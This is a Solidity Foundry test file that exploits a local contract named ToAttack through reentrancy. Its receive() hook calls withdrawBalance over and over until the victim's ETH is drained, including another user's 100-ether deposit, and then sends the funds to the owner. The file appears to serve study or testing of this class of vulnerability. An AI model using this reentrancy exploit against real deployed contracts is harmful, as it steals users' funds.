// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {ToAttack} from "../src/ToAttack.sol";

contract AttackerTest is Test {
    ToAttack public victim;
    address payable owner;

    function setUp() public {
        victim = new ToAttack();
        owner = payable(msg.sender);
    }

    function testAttack() external payable {
        console.log("User balance before deposit: %d", victim.getUserBalance());
        console.log("Victim balance before deposit: %d", address(victim).balance / 1 ether);
        victim.depositETH{value: 1 ether}();
        console.log("User balance after deposit: %d", victim.getUserBalance());
        
        vm.prank(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC);
        vm.deal(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC, 123 ether);
        victim.depositETH{value: 100 ether}();

        console.log("User balance after second deposit: %d", victim.getUserBalance());
        console.log("Victim balance after second deposit: %d", address(victim).balance / 1 ether);

        victim.withdrawBalance();
    }

    receive() external payable {
        console.log("Victim smart contract balance: %d", address(victim).balance / 1 ether);
        if(address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}

